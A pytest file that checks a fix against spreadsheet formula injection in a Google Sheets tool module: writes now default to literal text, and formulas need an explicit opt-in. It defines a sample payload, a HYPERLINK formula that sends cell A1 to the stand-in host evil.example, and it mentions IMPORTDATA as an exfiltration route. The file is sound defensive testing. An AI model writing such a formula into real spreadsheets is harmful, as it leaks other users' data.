"""Findings 10, 14, 45: writing to a sheet must not create formulas by default.

`modify_sheet_values` defaulted to `USER_ENTERED`, and `_to_extended_value` turned any
string starting with "=" into a `formulaValue`. Both made caller-supplied text a stored
injection: the payload runs in the spreadsheet of whoever opens it, not in the caller's
session, so `=HYPERLINK`, `=IMPORTDATA` and friends can exfiltrate other cells.
"""

from unittest.mock import Mock

import pytest

import gsheets.sheets_tools as sheets_tools
from gsheets.sheets_tools import _to_extended_value

FORMULA = '=HYPERLINK("https://evil.example?d="&A1,"click")'


def _unwrap(tool):
    fn = getattr(tool, "fn", tool)
    while hasattr(fn, "__wrapped__"):
        fn = fn.__wrapped__
    return fn


modify_sheet_values = _unwrap(sheets_tools.modify_sheet_values)
append_table_rows = _unwrap(sheets_tools.append_table_rows)


class TestExtendedValue:
    """Finding 10: append_table_rows builds cells through _to_extended_value."""

    def test_leading_equals_is_literal_by_default(self):
        assert _to_extended_value(FORMULA) == {"stringValue": FORMULA}

    def test_leading_equals_is_a_formula_only_when_opted_in(self):
        assert _to_extended_value(FORMULA, allow_formulas=True) == {
            "formulaValue": FORMULA
        }

    @pytest.mark.parametrize(
        ("value", "expected"),
        [
            (True, {"boolValue": True}),
            (False, {"boolValue": False}),
            (42, {"numberValue": 42}),
            (1.5, {"numberValue": 1.5}),
            ("plain", {"stringValue": "plain"}),
        ],
    )
    def test_non_formula_values_are_unchanged(self, value, expected):
        assert _to_extended_value(value) == expected
        assert _to_extended_value(value, allow_formulas=True) == expected


def _values_service():
    service = Mock()
    service.spreadsheets().values().update().execute.return_value = {
        "updatedCells": 1,
        "updatedRows": 1,
        "updatedColumns": 1,
    }
    return service


def _captured_value_input_option(service):
    return service.spreadsheets().values().update.call_args.kwargs["valueInputOption"]


class TestModifySheetValues:
    @pytest.mark.asyncio
    async def test_default_writes_raw(self):
        """Findings 14/45: RAW writes the string as text, so no formula is created."""
        service = _values_service()

        await modify_sheet_values(
            service=service,
            user_google_email="user@example.com",
            spreadsheet_id="sheet-1",
            range_name="A1",
            values=[[FORMULA]],
        )

        assert _captured_value_input_option(service) == "RAW"

    @pytest.mark.asyncio
    async def test_formulas_require_explicit_opt_in(self):
        """The capability is kept, but the caller has to ask for it."""
        service = _values_service()

        await modify_sheet_values(
            service=service,
            user_google_email="user@example.com",
            spreadsheet_id="sheet-1",
            range_name="A1",
            values=[["=1+1"]],
            allow_formulas=True,
        )

        assert _captured_value_input_option(service) == "USER_ENTERED"

    @pytest.mark.asyncio
    async def test_value_input_option_is_no_longer_caller_controlled(self):
        """The old escape hatch must be gone, not merely defaulted differently."""
        with pytest.raises(TypeError):
            await modify_sheet_values(
                service=_values_service(),
                user_google_email="user@example.com",
                spreadsheet_id="sheet-1",
                range_name="A1",
                values=[["=1+1"]],
                value_input_option="USER_ENTERED",
            )


def _tables_service(sheet_id=7, table_id="tbl-1"):
    service = Mock()
    service.spreadsheets().get().execute.return_value = {
        "sheets": [
            {"properties": {"sheetId": sheet_id}, "tables": [{"tableId": table_id}]}
        ]
    }
    service.spreadsheets().batchUpdate().execute.return_value = {}
    return service


def _appended_cells(service):
    body = service.spreadsheets().batchUpdate.call_args.kwargs["body"]
    return body["requests"][0]["appendCells"]["rows"][0]["values"]


class TestAppendTableRows:
    @pytest.mark.asyncio
    async def test_default_appends_literal_text(self):
        service = _tables_service()

        await append_table_rows(
            service=service,
            user_google_email="user@example.com",
            spreadsheet_id="sheet-1",
            table_id="tbl-1",
            values=[[FORMULA]],
        )

        assert _appended_cells(service) == [
            {"userEnteredValue": {"stringValue": FORMULA}}
        ]

    @pytest.mark.asyncio
    async def test_opt_in_appends_a_formula(self):
        service = _tables_service()

        await append_table_rows(
            service=service,
            user_google_email="user@example.com",
            spreadsheet_id="sheet-1",
            table_id="tbl-1",
            values=[["=1+1"]],
            allow_formulas=True,
        )

        assert _appended_cells(service) == [
            {"userEnteredValue": {"formulaValue": "=1+1"}}
        ]
